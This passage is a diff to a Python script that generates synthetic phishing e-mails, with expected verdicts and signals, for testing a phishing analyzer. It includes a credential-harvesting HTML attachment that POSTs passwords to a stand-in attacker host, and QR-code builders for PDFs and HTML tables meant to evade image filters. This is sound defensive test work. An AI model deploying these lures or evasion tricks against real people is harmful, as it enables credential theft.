@@ -219,6 +219,84 @@ def b64(s):
     return base64.b64encode(s.encode()).decode()
 
 
+def qr_matriz(conteudo):
+    """Módulos do QR (True = escuro), sem a margem."""
+    if '--libs' in sys.argv:
+        sys.path.append(sys.argv[sys.argv.index('--libs') + 1])
+    import segno
+    return [[bool(v) for v in linha] for linha in segno.make(conteudo, error='m').matrix]
+
+
+def pdf_com_qr(linhas, conteudo):
+    """PDF 1.4 inofensivo com texto e o QR Code como imagem (tons de cinza, FlateDecode)."""
+    import zlib
+    m = qr_matriz(conteudo)
+    margem = 4
+    lado = len(m) + 2 * margem
+    pixels = bytearray()
+    for y in range(lado):
+        for x in range(lado):
+            yy, xx = y - margem, x - margem
+            escuro = 0 <= yy < len(m) and 0 <= xx < len(m) and m[yy][xx]
+            pixels.append(0 if escuro else 255)
+    imagem = zlib.compress(bytes(pixels), 9)
+    texto = 'BT /F1 11 Tf 50 780 Td 14 TL ' + ' '.join(
+        f'({l.encode("latin-1", "replace").decode("latin-1").replace("(", "[").replace(")", "]")}) \'' for l in linhas) + ' ET'
+    desenho = texto + ' q 170 0 0 170 50 520 cm /Im1 Do Q'
+    objetos = [
+        b'<< /Type /Catalog /Pages 2 0 R >>',
+        b'<< /Type /Pages /Kids [3 0 R] /Count 1 >>',
+        b'<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R '
+        b'/Resources << /Font << /F1 5 0 R >> /XObject << /Im1 6 0 R >> >> >>',
+        f'<< /Length {len(desenho.encode("latin-1"))} >>\nstream\n{desenho}\nendstream'.encode('latin-1'),
+        b'<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>',
+        (f'<< /Type /XObject /Subtype /Image /Width {lado} /Height {lado} /ColorSpace /DeviceGray '
+         f'/BitsPerComponent 8 /Filter /FlateDecode /Length {len(imagem)} >>\nstream\n').encode('latin-1') + imagem + b'\nendstream',
+    ]
+    saida = b'%PDF-1.4\n%\xe2\xe3\xcf\xd3\n'
+    posicoes = []
+    for i, o in enumerate(objetos, 1):
+        posicoes.append(len(saida))
+        saida += f'{i} 0 obj\n'.encode() + o + b'\nendobj\n'
+    xref = len(saida)
+    saida += f'xref\n0 {len(objetos) + 1}\n0000000000 65535 f \n'.encode()
+    for p in posicoes:
+        saida += f'{p:010d} 00000 n \n'.encode()
+    saida += f'trailer\n<< /Size {len(objetos) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n'.encode()
+    return saida
+
+
+def qr_tabela_html(conteudo, px=4):
+    """QR "desenhado" com tabela HTML (uma célula por módulo), como fazem os kits que fogem de filtro de imagem."""
+    m = qr_matriz(conteudo)
+    margem = 4
+    lado = len(m) + 2 * margem
+    linhas = []
+    for y in range(lado):
+        celulas = []
+        for x in range(lado):
+            yy, xx = y - margem, x - margem
+            escuro = 0 <= yy < len(m) and 0 <= xx < len(m) and m[yy][xx]
+            celulas.append(f'<td style="width:{px}px;height:{px}px;background-color:{"#000000" if escuro else "#ffffff"}"></td>')
+        linhas.append('<tr>' + ''.join(celulas) + '</tr>')
+    return '<table cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse">' + ''.join(linhas) + '</table>'
+
+
+def pix_copia_e_cola(chave, nome, cidade, valor, txid):
+    """BR Code do PIX (padrão EMV do Banco Central), com o CRC16 no fim, como num boleto de verdade."""
+    campo = lambda i, v: f'{i}{len(v):02d}{v}'
+    conta = campo('00', 'br.gov.bcb.pix') + campo('01', chave)
+    corpo = (campo('00', '01') + campo('26', conta) + campo('52', '0000') + campo('53', '986') + campo('54', valor)
+             + campo('58', 'BR') + campo('59', nome) + campo('60', cidade) + campo('62', campo('05', txid)) + '6304')
+    crc = 0xFFFF
+    for b in corpo.encode():
+        crc ^= b << 8
+        for _ in range(8):
+            crc = ((crc << 1) ^ 0x1021) if crc & 0x8000 else crc << 1
+            crc &= 0xFFFF
+    return corpo + f'{crc:04X}'
+
+
 # ---------------------------------------------------------------- montagem do .eml
 
 def montar(cabecalhos, corpo):
@@ -335,13 +413,9 @@ caso(
     requerente='carla.mendes (Diretoria)',
     esperado=dict(classificacao='phishing', phishing_type=['AiTM', 'Credential Harvesting'], delivery_channel='Email',
                   target='Executive', gravidade='critica', mitre=['T1566.002', 'T1557', 'T1539']),
-    sinais_obrigatorios=['hospedagem'],
+    sinais_obrigatorios=['hospedagem', 'aitm-isca', 'compartilhamento-falso', 'relato-pagina-falsa'],
     bloqueio=dict(deve_ter=['proposta-moreira-adv.pages.dev'], nao_pode_ter=['pages.dev']),
     reputacao=dict(rdap={dom: 3412}),
-    sinais_futuros=['aitm-isca'],
-    lacuna=('Remetente legítimo (autenticação passa, domínio antigo): o analisador ainda não reconhece o padrão AiTM '
-            '(e-mail da vítima em base64 na URL, "documento compartilhado" fora do SharePoint/OneDrive, página em '
-            'pages.dev/workers.dev). Sem o relato, a nota fica baixa.'),
 )
 
 # 03 ---------------------------------------------------------------- quishing (QR Code em imagem, quase sem texto)
@@ -381,13 +455,11 @@ caso(
     requerente='pedro.alves (TI)',
     esperado=dict(classificacao='phishing', phishing_type=['QR', 'Credential Harvesting'], delivery_channel='Email',
                   target='User', gravidade='media', mitre=['T1566.002', 'T1656']),
-    sinais_obrigatorios=['qrcode'],
+    sinais_obrigatorios=['qrcode', 'imita-organizacao', 'qrcode-decodificado', 'aitm-isca'],
     bloqueio=dict(deve_ter=[dom], nao_pode_ter=[ORG]),
     reputacao=dict(rdap={dom: 2}),
-    sinais_futuros=['qrcode-decodificado'],
-    lacuna=('O link está só dentro do QR Code (imagem): o analisador ainda não lê QR Codes, então o domínio '
-            'mfa-cybersecurity.example não aparece nos IOCs. Também não reconhece imitação do domínio da PRÓPRIA empresa.'),
     ioc_escondido='mfa-cybersecurity.example',
+    qr={'image001.png': [destino_qr]},
 )
 
 # 04 ---------------------------------------------------------------- HTML smuggling (nota fiscal)
@@ -430,11 +502,9 @@ caso(
     requerente='ana.ribeiro (Compras)',
     esperado=dict(classificacao='phishing', phishing_type=['Malware Delivery'], delivery_channel='Email',
                   target='Finance', gravidade='media', mitre=['T1566.001', 'T1027.006', 'T1204.002']),
-    sinais_obrigatorios=['anexo-perigoso', 'spf', 'dmarc', 'pagamento'],
+    sinais_obrigatorios=['anexo-perigoso', 'spf', 'dmarc', 'pagamento', 'html-smuggling'],
     bloqueio=dict(deve_ter=[dom], nao_pode_ter=[ORG]),
     reputacao=dict(rdap={dom: 11}),
-    sinais_futuros=['html-smuggling'],
-    lacuna='O analisador vê "anexo .html", mas não reconhece o HTML smuggling (atob + Blob + download automático).',
 )
 
 # 05 ---------------------------------------------------------------- SVG com JavaScript (mensagem de voz)
@@ -472,12 +542,9 @@ caso(
     requerente='lucas.ferreira (Comercial)',
     esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                   target='User', gravidade='alta', mitre=['T1566.001', 'T1027.006']),
-    sinais_obrigatorios=['anexo-perigoso'],
+    sinais_obrigatorios=['anexo-perigoso', 'svg-script'],
     bloqueio=dict(deve_ter=[dom], nao_pode_ter=[ORG]),
     reputacao=dict(rdap={dom: 6}),
-    sinais_futuros=['svg-script'],
-    lacuna=('O analisador marca o .svg como perigoso, mas não lê o <script> nem decodifica o atob(): o domínio '
-            'voicemail-player.example (destino real) não aparece nos IOCs.'),
     ioc_escondido='voicemail-player.example',
 )
 
@@ -517,13 +584,9 @@ caso(
     requerente='maria.souza (Financeiro)',
     esperado=dict(classificacao='phishing', phishing_type=['OAuth', 'Consent Phishing'], delivery_channel='Email',
                   target='Finance', gravidade='critica', mitre=['T1566.002', 'T1528']),
-    sinais_obrigatorios=[],
+    sinais_obrigatorios=['oauth-consentimento'],
     bloqueio=dict(deve_ter=[dom], nao_pode_ter=['login.microsoftonline.com', 'microsoftonline.com']),
     reputacao=dict(rdap={dom: 8}),
-    sinais_futuros=['oauth-consentimento'],
-    lacuna=('O link é do domínio oficial da Microsoft, então hoje ele vai para "fora do bloqueio" e não gera sinal. '
-            'Falta reconhecer URL de consentimento OAuth (oauth2/authorize + prompt=consent + escopos de e-mail/arquivos '
-            '+ redirect_uri externo) e orientar a revogar o app no Entra ID (trocar senha não basta).'),
 )
 
 # 07 ---------------------------------------------------------------- SharePoint real de um tenant comprometido
@@ -567,14 +630,14 @@ caso(
     requerente='maria.souza (Financeiro)',
     esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                   target='Finance', gravidade='alta', mitre=['T1566.002', 'T1199']),
-    sinais_obrigatorios=[],
+    sinais_obrigatorios=['relato-pagina-falsa'],
     sinais_proibidos=['marca'],
     bloqueio=dict(deve_ter=[], nao_pode_ter=['sharepoint.com', 'sharepointonline.com', 'construtoranogueira-my.sharepoint.com']),
     reputacao=dict(),
-    sinais_futuros=['relato-pagina-falsa'],
-    lacuna=('Pelo e-mail, nada denuncia: a evidência está no relato ("pediu a senha numa página de outro endereço"). '
-            'O analisador ainda não pesa o relato do usuário como evidência, só como interação. Atenção: o domínio do '
-            'cliente invadido (Reply-To) entra nos IOCs; o analista não deve bloqueá-lo (cortaria um cliente).'),
+    lacuna=('Pelo e-mail, nada denuncia (SharePoint verdadeiro de um cliente invadido): só o relato ("pediu a senha numa '
+            'página de outro endereço") levanta a suspeita, e sozinho ele leva a INCONCLUSIVO (vai ao analista), não a phishing. '
+            'A página falsa está atrás do PDF, que o analisador não abre. Atenção: o domínio do cliente invadido (Reply-To) '
+            'entra nos IOCs; o analista não deve bloqueá-lo (cortaria um cliente).'),
 )
 
 # 08 ---------------------------------------------------------------- BEC: diretora pede cartões-presente
@@ -602,12 +665,9 @@ caso(
     requerente='lucas.ferreira (Comercial)',
     esperado=dict(classificacao='phishing', phishing_type=['BEC'], delivery_channel='Email',
                   target='User', gravidade='media', mitre=['T1566', 'T1656']),
-    sinais_obrigatorios=['bec'],
+    sinais_obrigatorios=['bec', 'bec-nome-interno', 'bec-executivo-webmail'],
     bloqueio=dict(deve_ter=[], nao_pode_ter=['gmail.com', ORG]),
     reputacao=dict(),
-    sinais_futuros=['bec-nome-interno'],
-    lacuna=('Não liga o NOME do remetente a uma pessoa da organização (Carla Mendes é diretora) nem pega "Diretora" '
-            'no feminino; sem isso a nota fica baixa e o caso depende da IA.'),
 )
 
 # 09 ---------------------------------------------------------------- BEC: fornecedor sósia troca dados bancários
@@ -647,12 +707,9 @@ caso(
     requerente='ana.ribeiro (Compras)',
     esperado=dict(classificacao='phishing', phishing_type=['BEC'], delivery_channel='Email',
                   target='Finance', gravidade='alta', mitre=['T1566.001', 'T1656', 'T1534']),
-    sinais_obrigatorios=['bec', 'dominio-novo'],
+    sinais_obrigatorios=['bec', 'dominio-novo', 'dominio-sosia-conversa'],
     bloqueio=dict(deve_ter=[dom], nao_pode_ter=[dom_real, ORG]),
     reputacao=dict(rdap={dom: 5}),
-    sinais_futuros=['dominio-sosia-conversa'],
-    lacuna=('Não compara o domínio do remetente com os domínios que JÁ aparecem na conversa citada '
-            '(graficapaullsta x graficapaulista): é o sinal mais forte desse golpe.'),
 )
 
 # 10 ---------------------------------------------------------------- BEC: desvio de salário (RH)
@@ -680,12 +737,12 @@ caso(
     requerente='joao.lima (RH)',
     esperado=dict(classificacao='phishing', phishing_type=['BEC'], delivery_channel='Email',
                   target='HR', gravidade='media', mitre=['T1566', 'T1656']),
-    sinais_obrigatorios=[],
+    sinais_obrigatorios=['bec-conta-salario', 'bec-pretexto'],
     bloqueio=dict(deve_ter=[], nao_pode_ter=['outlook.com', ORG]),
     reputacao=dict(),
-    sinais_futuros=['bec-conta-salario'],
-    lacuna=('Nenhuma regra pega "troca de conta salário" nem nome de funcionário vindo de webmail. Hoje sai como '
-            'legítimo/inconclusivo: depende inteiramente da IA e do analista.'),
+    lacuna=('As regras pegam a troca de conta salário e a desculpa do e-mail pessoal, mas sem saber que João Lima é '
+            'funcionário a nota fica em INCONCLUSIVO (vai ao analista). Resolve quando a lista de pessoas da organização '
+            'vier do AD/GLPI (hoje "nomesInternos" tem só as pessoas-chave).'),
 )
 
 # 11 ---------------------------------------------------------------- Receita Federal / CPF (encurtador)
@@ -721,11 +778,9 @@ caso(
     requerente='pedro.alves (TI)',
     esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                   target='User', gravidade='media', mitre=['T1566.002', 'T1656']),
-    sinais_obrigatorios=['marca', 'encurtador', 'urgencia'],
+    sinais_obrigatorios=['marca', 'encurtador', 'urgencia', 'imitacao-dominio-novo'],
     bloqueio=dict(deve_ter=[dom], nao_pode_ter=['bit.ly', 'gov.br']),
     reputacao=dict(rdap={dom: 9}),
-    lacuna=('Calibração: marca imitada + domínio com menos de 30 dias ainda soma 55 (abaixo de 60) e fica '
-            'inconclusivo sem a IA. Para um N3 é phishing.'),
 )
 
 # 12 ---------------------------------------------------------------- Correios: taxa de importação por PIX (usuário pagou)
@@ -797,11 +852,9 @@ caso(
     requerente='carla.mendes (Diretoria)',
     esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                   target='Executive', gravidade='media', mitre=['T1566.002']),
-    sinais_obrigatorios=['marca', 'hospedagem'],
+    sinais_obrigatorios=['marca', 'hospedagem', 'imitacao-dominio-novo', 'compartilhamento-falso'],
     bloqueio=dict(deve_ter=[dom], nao_pode_ter=['ipfs.io', 'docusign.com', 'docusign.net']),
     reputacao=dict(rdap={dom: 15}),
-    lacuna=('Calibração: marca imitada + domínio com menos de 30 dias ainda soma 53 (abaixo de 60) e fica '
-            'inconclusivo sem a IA. Para um N3 é phishing.'),
 )
 
 # 14 ---------------------------------------------------------------- homógrafo (IDN / punycode)
@@ -833,11 +886,9 @@ caso(
     requerente='pedro.alves (TI)',
     esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                   target='User', gravidade='media', mitre=['T1566.002', 'T1583.001']),
-    sinais_obrigatorios=['punycode-remetente', 'url-punycode', 'marca'],
+    sinais_obrigatorios=['punycode-remetente', 'url-punycode', 'marca', 'imitacao-dominio-novo'],
     bloqueio=dict(deve_ter=[dom], nao_pode_ter=['microsoft.com', 'live.com']),
     reputacao=dict(rdap={dom: 2}),
-    lacuna=('Calibração: marca imitada + domínio com menos de 30 dias ainda soma 55 (abaixo de 60) e fica '
-            'inconclusivo sem a IA. Para um N3 é phishing.'),
 )
 
 # 15 ---------------------------------------------------------------- malware: zip com .lnk (comprovante PIX)
@@ -868,11 +919,9 @@ caso(
     requerente='maria.souza (Financeiro)',
     esperado=dict(classificacao='phishing', phishing_type=['Malware Delivery'], delivery_channel='Email',
                   target='Finance', gravidade='critica', mitre=['T1566.001', 'T1204.002', 'T1059.001']),
-    sinais_obrigatorios=['anexo-compactado', 'pagamento'],
+    sinais_obrigatorios=['anexo-compactado', 'pagamento', 'zip-conteudo-perigoso'],
     bloqueio=dict(deve_ter=[dom], nao_pode_ter=[ORG]),
     reputacao=dict(rdap={dom: 7}),
-    sinais_futuros=['zip-conteudo-perigoso'],
-    lacuna='O analisador vê só "anexo .zip": não lista os nomes dos arquivos de dentro (o .pdf.lnk é a prova).',
 )
 
 # 16 ---------------------------------------------------------------- callback phishing (fatura verdadeira do PayPal)
@@ -911,12 +960,9 @@ caso(
     requerente='lucas.ferreira (Comercial)',
     esperado=dict(classificacao='phishing', phishing_type=['Vishing'], delivery_channel='Email',
                   target='User', gravidade='media', mitre=['T1566.004', 'T1656']),
-    sinais_obrigatorios=['pagamento', 'urgencia'],
+    sinais_obrigatorios=['pagamento', 'urgencia', 'callback-telefone'],
     bloqueio=dict(deve_ter=[], nao_pode_ter=['paypal.com', 'www.paypal.com']),
     reputacao=dict(),
-    sinais_futuros=['callback-telefone'],
-    lacuna=('Tudo é legítimo (PayPal, autenticação, link): o golpe está no TELEFONE da observação. Falta reconhecer '
-            '"ligue para cancelar" + cobrança inesperada de assinatura, e extrair o telefone como IOC.'),
 )
 
 # 17 ---------------------------------------------------------------- encaminhado como anexo, imitando o RH (digitou senha)
@@ -963,12 +1009,124 @@ caso(
     requerente='joao.lima (RH)',
     esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
                   target='HR', gravidade='critica', mitre=['T1566.002', 'T1656']),
-    sinais_obrigatorios=[],
+    sinais_obrigatorios=['imita-organizacao', 'credenciais', 'relato-pagina-falsa'],
     bloqueio=dict(deve_ter=[dom], nao_pode_ter=[ORG]),
     reputacao=dict(rdap={dom: 4}),
-    sinais_futuros=['imita-organizacao'],
-    lacuna=('Não reconhece imitação do domínio da própria empresa (rh-cybersecurity.example x cybersecurity.local) '
-            'nem o pedido "acesse com o seu usuário e senha da rede" (o sinal "credenciais" não pega essa frase).'),
+)
+
+# 18 ---------------------------------------------------------------- anexo HTML com tela de login local
+dom = 'faturamento-digital.example'
+coleta = 'coleta-acesso.example'
+ip = '203.0.113.77'
+data = 'Thu, 19 Nov 2026 15:22:08 +0000'
+rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
+pagina = f'''<!DOCTYPE html>
+<html lang="pt-br"><head><meta charset="utf-8"><title>Visualizar documento</title>
+<style>body{{font-family:Segoe UI,Arial;background:#f2f2f2}}.c{{width:360px;margin:80px auto;background:#fff;padding:28px}}</style></head>
+<body><div class="c"><h3>Documento protegido</h3><p>Para visualizar a fatura, confirme a sua conta corporativa.</p>
+<form method="POST" action="https://{coleta}/doc/recebe.php">
+<input type="email" name="u" value="lucas.ferreira@{ORG}" readonly><br>
+<input type="password" name="p" placeholder="Senha"><br>
+<button type="submit">Visualizar</button></form>
+<p style="font-size:11px;color:#888">Documento de teste do corpus do analisador-phishing-glpi.</p></div></body></html>'''.encode('utf-8')
+txt = ('Prezado(a),\n\nSegue a fatura nº 20261119-0832 em anexo. O documento é protegido: abra o arquivo e confirme a '
+       'sua conta para visualizar.\n\nFaturamento Digital\n')
+corpo = MIMEMultipart('mixed')
+corpo.set_boundary('----=_Part_88231_1763565728')
+corpo.attach(texto(txt))
+corpo.attach(anexo(pagina, 'text/html', 'Fatura_20261119-0832.html'))
+caso(
+    id='18-html-login-local',
+    titulo='Credenciais: anexo .html com tela de login que envia a senha para o atacante',
+    tecnica=('Página de login dentro do próprio anexo (não há link no corpo): o formulário já vem com o e-mail da vítima '
+             'e manda a senha por POST para o servidor do atacante. Escapa de filtros que só olham links.'),
+    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'none', 'none'), rec_ext,
+               ('From', nome_codificado('Faturamento Digital', f'nfe@{dom}')),
+               ('To', f'lucas.ferreira@{ORG}'), ('Subject', assunto('Fatura 20261119-0832 disponível')),
+               ('Date', data), ('Message-ID', f'<88231.1763565728@{dom}>'), *antispam_exo()],
+    corpo=corpo,
+    relato='Abri o anexo da fatura e ele pediu a minha senha, mas eu não digitei. Não conheço essa empresa.',
+    requerente='lucas.ferreira (Comercial)',
+    esperado=dict(classificacao='phishing', phishing_type=['Credential Harvesting'], delivery_channel='Email',
+                  target='User', gravidade='alta', mitre=['T1566.001', 'T1056.003']),
+    sinais_obrigatorios=['anexo-perigoso', 'html-login-local'],
+    bloqueio=dict(deve_ter=[dom, coleta], nao_pode_ter=[ORG]),
+    reputacao=dict(rdap={dom: 12}),
+    ioc_escondido=coleta,
+)
+
+# 19 ---------------------------------------------------------------- quishing: QR Code dentro de um PDF anexo
+dom = 'assinatura-eletronica-docs.example'
+destino = 'assina-docs-seguro.example'
+ip = '203.0.113.141'
+data = 'Fri, 20 Nov 2026 09:12:44 +0000'
+rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
+destino_qr = f'https://{destino}/s/?d=8841'
+txt = ('Prezado(a),\n\nVocê tem um documento aguardando assinatura: Contrato de Prestação de Serviços 2027.\n\n'
+       'Por segurança, o link de assinatura só abre no celular: abra o PDF anexo e escaneie o QR Code com a câmera.\n'
+       'O documento expira em 24 horas.\n\nAssinatura Eletrônica Docs\n')
+corpo = MIMEMultipart('mixed')
+corpo.set_boundary('----=_Part_8841_1763629964')
+corpo.attach(texto(txt))
+corpo.attach(anexo(pdf_com_qr(['Contrato de Prestacao de Servicos 2027', 'Escaneie o QR Code abaixo com o celular para assinar.',
+                               'Documento de teste do corpus do analisador-phishing-glpi'], destino_qr),
+                   'application/pdf', 'Contrato_Prestacao_Servicos_2027.pdf'))
+caso(
+    id='19-quishing-qr-no-pdf',
+    titulo='Quishing: QR Code dentro de um PDF anexo ("assine pelo celular")',
+    tecnica=('O link fica só dentro de um QR Code desenhado num PDF anexo: o corpo não tem link e o filtro de anexos vê um '
+             'PDF comum. "Só abre no celular" tira o acesso do computador protegido (proxy, EDR).'),
+    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'none', 'none'), rec_ext,
+               ('From', nome_codificado('Assinatura Eletrônica Docs', f'documentos@{dom}')),
+               ('To', f'ana.ribeiro@{ORG}'), ('Subject', assunto('Documento aguardando sua assinatura')),
+               ('Date', data), ('Message-ID', f'<8841.1763629964@{dom}>'), *antispam_exo()],
+    corpo=corpo,
+    relato='Chegou um contrato para assinar com QR Code no PDF. Não escaneei, não esperava contrato nenhum.',
+    requerente='ana.ribeiro (Financeiro)',
+    esperado=dict(classificacao='phishing', phishing_type=['QR', 'Credential Harvesting'], delivery_channel='Email',
+                  target='Finance', gravidade='media', mitre=['T1566.001', 'T1566.002']),
+    sinais_obrigatorios=['qrcode', 'qrcode-decodificado'],
+    bloqueio=dict(deve_ter=[dom, destino], nao_pode_ter=[ORG]),
+    reputacao=dict(rdap={dom: 6, destino: 3}),
+    ioc_escondido=destino,
+    qr={'Contrato_Prestacao_Servicos_2027.pdf': [destino_qr]},
+)
+
+# 20 ---------------------------------------------------------------- quishing: QR "desenhado" com tabela HTML
+dom = 'conta-seguranca-online.example'
+destino = 'verifica-acesso-m365.example'
+ip = '198.51.100.188'
+data = 'Fri, 20 Nov 2026 14:40:02 +0000'
+rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
+destino_qr = f'https://{destino}/v/?id=55120'
+htm = f'''<html><body style="font-family:Segoe UI,Arial;font-size:14px">
+<p><b>Verificação de segurança obrigatória</b></p>
+<p>Detectamos um acesso incomum à sua conta. Para manter o acesso ao e-mail, escaneie o código abaixo com o celular
+e confirme a sua identidade em até 12 horas.</p>
+{qr_tabela_html(destino_qr)}
+<p style="font-size:11px;color:#777">Equipe de Segurança de Contas</p></body></html>'''
+txt = ('Verificação de segurança obrigatória\n\nDetectamos um acesso incomum à sua conta. Para manter o acesso ao e-mail, '
+       'escaneie o código com o celular e confirme a sua identidade em até 12 horas.\n\nEquipe de Segurança de Contas\n')
+corpo = alternativo(txt, htm, '_000_QRTABELA55120_')
+caso(
+    id='20-quishing-qr-tabela-html',
+    titulo='Quishing: QR Code "desenhado" com tabela HTML (sem imagem)',
+    tecnica=('O QR Code é montado com centenas de células de tabela pretas e brancas: não há imagem para o filtro ler. '
+             'Técnica vista em kits de 2024-2025 para fugir de leitores de QR em imagem.'),
+    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'none', 'none'), rec_ext,
+               ('From', nome_codificado('Segurança da Conta', f'alerta@{dom}')),
+               ('To', f'lucas.ferreira@{ORG}'), ('Subject', assunto('Ação necessária: verificação de segurança')),
+               ('Date', data), ('Message-ID', f'<55120.qr@{dom}>'), *antispam_exo()],
+    corpo=corpo,
+    relato='Recebi pedido de verificação de segurança com um código para escanear. Não escaneei.',
+    requerente='lucas.ferreira (Comercial)',
+    esperado=dict(classificacao='phishing', phishing_type=['QR', 'Credential Harvesting'], delivery_channel='Email',
+                  target='User', gravidade='media', mitre=['T1566.002', 'T1027']),
+    sinais_obrigatorios=['qrcode-desenhado', 'qrcode-decodificado'],
+    bloqueio=dict(deve_ter=[dom, destino], nao_pode_ter=[ORG]),
+    reputacao=dict(rdap={dom: 9, destino: 2}),
+    ioc_escondido=destino,
+    qr={'qr-desenhado-1.pgm': [destino_qr]},
 )
 
 # ================================================================ LEGÍTIMOS (controle de falso positivo)
@@ -1197,6 +1355,169 @@ caso(
     reputacao=dict(),
 )
 
+# L7 ---------------------------------------------------------------- .zip verdadeiro do fornecedor (PDF + XML)
+dom = 'graficapaulista.example'
+ip = '198.51.100.200'
+data = 'Mon, 23 Nov 2026 10:05:00 +0000'
+rec, rec_ext = received_exo(f'mail.{dom}', ip, data)
+z = zip_fixo([('NFe_4513/DANFE_NFe_4513.pdf', pdf_minimo(['DANFE - NF-e 4513', 'Documento de teste do corpus'])),
+              ('NFe_4513/35261100000000000191550010000045131000045130-nfe.xml', b'<?xml version="1.0"?><nfeProc versao="4.00"/>')])
+txt = ('Prezado cliente,\n\nSegue em anexo (compactado) o DANFE e o XML da NF-e nº 4513 referente ao pedido 4480.\n\n'
+       'Gráfica Paulista Ltda\nEste é um e-mail automático do sistema de faturamento.\n')
+corpo = MIMEMultipart('mixed')
+corpo.set_boundary('----=_Part_NFe_4513_1763892300')
+corpo.attach(texto(txt))
+corpo.attach(anexo(z, 'application/zip', 'NFe_4513.zip'))
+caso(
+    id='L7-zip-notas-fornecedor',
+    titulo='LEGÍTIMO: .zip verdadeiro do fornecedor conhecido com PDF e XML da nota',
+    tecnica='Controle de falso positivo do detector de .zip: compactado, mas só com documentos (PDF/XML), de domínio antigo e autenticado.',
+    cabecalhos=rec + [*autenticacao_exo(ip, dom, dom, 'pass', 'pass', 'pass'), rec_ext, dkim_assinatura(dom),
+               ('From', nome_codificado('Gráfica Paulista - Faturamento', f'nfe@{dom}')),
+               ('To', f'ana.ribeiro@{ORG}'), ('Subject', assunto('NF-e 4513 - Gráfica Paulista')),
+               ('Date', data), ('Message-ID', f'<nfe4513.1763892300@{dom}>'), *antispam_exo()],
+    corpo=corpo,
+    relato='A gráfica mandou as notas num zip. Posso abrir?',
+    requerente='ana.ribeiro (Financeiro)',
+    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='Finance', gravidade='baixa', mitre=[]),
+    sinais_obrigatorios=['autenticado', 'anexo-compactado'],
+    sinais_proibidos=['zip-conteudo-perigoso', 'zip-com-senha', 'html-smuggling', 'dupla-extensao'],
+    bloqueio=dict(deve_ter=[], nao_pode_ter=[ORG]),
+    reputacao=dict(rdap={dom: 5120}),
+)
+
+# L8 ---------------------------------------------------------------- alerta verdadeiro de compra no cartão (assinatura + telefone)
+ip = '192.0.2.44'  # IP de documentação: não sabemos o IP real do servidor do banco
+data = 'Mon, 23 Nov 2026 21:14:00 +0000'
+rec, rec_ext = received_exo('mta-out03.comunicacao.itau.com.br', ip, data)
+htm = '''<html><body style="font-family:Arial;font-size:14px">
+<div style="background:#ec7000;color:#fff;padding:14px"><b>Itaú</b></div>
+<div style="padding:18px"><p>Olá, Lucas,</p>
+<p>Compra aprovada no cartão final 4410: <b>Assinatura mensal STREAMFLIX</b>, R$ 55,90, em 23/11 às 21:13.</p>
+<p>Se você não reconhece esta compra, bloqueie o cartão pelo app Itaú ou ligue para a Central de Atendimento: 4004-0000
+(capitais) ou 0800 000 0000 (demais localidades).</p>
+<p>O Itaú nunca pede senha, token ou código por e-mail, SMS ou telefone.</p></div></body></html>'''
+txt = ('Olá, Lucas,\n\nCompra aprovada no cartão final 4410: Assinatura mensal STREAMFLIX, R$ 55,90, em 23/11 às 21:13.\n\n'
+       'Se você não reconhece esta compra, bloqueie o cartão pelo app Itaú ou ligue para a Central de Atendimento: '
+       '4004-0000 (capitais) ou 0800 000 0000 (demais localidades).\n\nO Itaú nunca pede senha, token ou código por '
+       'e-mail, SMS ou telefone.\n')
+corpo = alternativo(txt, htm, '----=_Part_itau_alerta_4410')
+caso(
+    id='L8-banco-alerta-compra-assinatura',
+    titulo='LEGÍTIMO: alerta verdadeiro do banco de compra de assinatura, com telefone da central',
+    tecnica=('Controle de falso positivo do detector de golpe por telefone: fala de assinatura mensal e manda ligar se não '
+             'reconhecer, mas vem do domínio oficial do banco, autenticado, e o banco não repassa texto de terceiros.'),
+    cabecalhos=rec + [*autenticacao_exo(ip, 'comunicacao.itau.com.br', 'comunicacao.itau.com.br', 'pass', 'pass', 'pass'), rec_ext,
+               dkim_assinatura('comunicacao.itau.com.br', 'itau1'),
+               ('From', nome_codificado('Itaú Cartões', 'alertas@comunicacao.itau.com.br')),
+               ('To', f'lucas.ferreira@{ORG}'), ('Subject', assunto('Compra aprovada no seu cartão final 4410')),
+               ('Date', data), ('Message-ID', '<alerta4410.20261123211400@comunicacao.itau.com.br>'), *antispam_exo()],
+    corpo=corpo,
+    relato='Chegou alerta de compra do Itaú no e-mail do trabalho. Fui eu que assinei, mas quero saber se o e-mail é verdadeiro.',
+    requerente='lucas.ferreira (Comercial)',
+    esperado=dict(classificacao='legitimo', phishing_type=[], delivery_channel='Email', target='User', gravidade='baixa', mitre=[]),
+    sinais_obrigatorios=['autenticado'],
+    sinais_proibidos=['callback-telefone', 'marca', 'marca-link'],
+    bloqueio=dict(deve_ter=[], nao_pode_ter=['itau.com.br', 'comunicacao.itau.com.br']),
+    reputacao=dict(),
+)
+
+# L9 ---------------------------------------------------------------- TI interna: login no app novo pela Microsoft (OAuth sem risco)
+data = 'Tue, 24 Nov 2026 09:00:00 +0000'
+alvo = ('https://login.microsoftonline.com/0f6a1d2c-3b4e-4f5a-8c9d-1e2f3a4b5c6d/oauth2/v2.0/authorize?client_id='
+        '5c1d2e3f-4a5b-4c6d-8e7f-9a0b1c2d3e4f&response_type=code&redirect_uri=https%3A%2F%2Fponto.cybersecurity.local'
+        '%2Fsignin-oidc&scope=openid%20profile%20User.Read&response_mode=form_post')
+htm = f'''<html><body style="font-family:Calibri,Arial;font-size:11pt">
+<p>Olá, equipe,</p>
